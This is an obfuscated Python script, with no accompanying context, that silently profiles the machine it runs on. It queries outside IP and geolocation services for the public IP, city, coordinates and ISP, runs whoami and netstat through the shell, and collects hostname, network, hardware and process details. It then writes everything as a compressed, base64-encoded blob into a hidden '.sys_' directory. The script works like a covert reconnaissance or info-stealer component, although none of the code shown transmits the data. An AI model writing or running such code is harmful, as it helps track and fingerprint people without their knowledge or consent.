import os,sys,socket,platform,datetime,requests,psutil,GPUtil,uuid,subprocess,locale,base64,zlib,json

_k=str(uuid.getnode()).encode()
_e=lambda d:base64.b64encode(zlib.compress(d.encode())).decode()

_p=lambda:os.path.join(os.getcwd(),".sys_"+_e(str(uuid.uuid4()))[:10])
_d=_p();os.makedirs(_d,exist_ok=True)

def _r(u,t=3):
    try:return requests.get(u,timeout=t)
    except:return None

def _ip():
    x=_r("https://api.ipify.org");return x.text if x else "0.0.0.0"

def _geo(i):
    x=_r(f"https://get.geojs.io/v1/ip/geo/{i}.json")
    try:return x.json() if x else {}
    except:return {}

def _geo2():
    x=_r("https://ipapi.co/json/")
    try:return x.json() if x else {}
    except:return {}

def _gpu():
    try:return [{"n":g.name,"l":g.load,"t":g.temperature} for g in GPUtil.getGPUs()]
    except:return []

def _sys():
    try:return {
        "o":platform.system(),"r":platform.release(),
        "v":platform.version(),"a":platform.architecture(),
        "c":platform.processor(),"m":platform.machine()
    }
    except:return {}

def _net():
    try:
        h=socket.gethostname()
        return {"h":h,"l":socket.gethostbyname(h),"d":socket.gethostbyname_ex(h)[2]}
    except:return {}

def _disk():
    try:
        u=psutil.disk_usage('/')
        return {"t":u.total,"f":u.free,"p":u.percent}
    except:return {}

def _mem():
    try:
        m=psutil.virtual_memory()
        return {"t":m.total,"u":m.used,"p":m.percent}
    except:return {}

def _cpu():
    try:
        return {"c":psutil.cpu_count(),"u":psutil.cpu_percent(interval=0.5)}
    except:return {}

def _proc():
    try:return {"p":len(psutil.pids()),"t":sum(x.num_threads() for x in psutil.process_iter())}
    except:return {}

def _bat():
    try:
        b=psutil.sensors_battery()
        return {"p":b.percent,"c":b.power_plugged} if b else {}
    except:return {}

def _drv():
    try:return [x.device for x in psutil.disk_partitions()]
    except:return []

def _if():
    try:return list(psutil.net_if_addrs().keys())
    except:return []

def _boot():
    try:return int(psutil.boot_time())
    except:return 0

def _cmd(c):
    try:return subprocess.check_output(c,shell=True,stderr=subprocess.DEVNULL).decode().strip()
    except:return ""

def _netstat():
    o=_cmd("netstat -an")
    return o.splitlines()[:8] if o else []

def _who():
    return _cmd("whoami")

def _fmt(b):
    try:return round(b/(1024**3),2)
    except:return 0

def _pack(d):
    try:return _e(json.dumps(d))
    except:return ""

def _run():
    fn=os.path.join(_d,_e(socket.gethostname())[:12]+".bin")
    with open(fn,"w") as f:

        ip=_ip()
        g1=_geo(ip);g2=_geo2()
        n=_net();s=_sys()

        core={
            "id":_who(),
            "h":n.get("h"),
            "ip":[ip,n.get("l")],
            "dns":n.get("d"),
            "bt":_boot()
        }

        geo={
            "c":g1.get("city") or g2.get("city"),
            "r":g1.get("region") or g2.get("region"),
            "co":g1.get("country") or g2.get("country_name"),
            "lt":g1.get("latitude") or g2.get("latitude"),
            "ln":g1.get("longitude") or g2.get("longitude"),
            "tz":g1.get("timezone") or g2.get("timezone"),
            "isp":g1.get("organization") or g2.get("org")
        }

        sysb={
            "os":[s.get("o"),s.get("r")],
            "cpu":_cpu(),
            "ram":_mem(),
            "dsk":_disk(),
            "gpu":_gpu()
        }

        live={
            "pr":_proc(),
            "bt":_bat(),
            "if":_if(),
            "dr":_drv(),
            "ns":_netstat()
        }

        blob={
            "A":core,
            "B":geo,
            "C":sysb,
            "D":live,
            "T":int(datetime.datetime.now().timestamp())
        }

        f.write(_pack(blob))

if __name__=="__main__":_run()